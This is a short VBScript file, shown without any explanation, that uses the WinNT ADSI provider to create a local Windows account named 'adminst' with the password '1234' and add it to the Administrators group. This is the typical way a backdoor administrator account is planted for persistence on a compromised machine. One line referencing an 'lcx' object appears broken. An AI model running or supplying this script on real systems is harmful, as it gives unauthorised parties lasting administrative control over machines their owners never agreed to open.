set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","adminst")
od.SetPassword "1234"
od.SetInfo
Set of=GetObject(os&"/lcx",user)
oe.add os&"/adminst"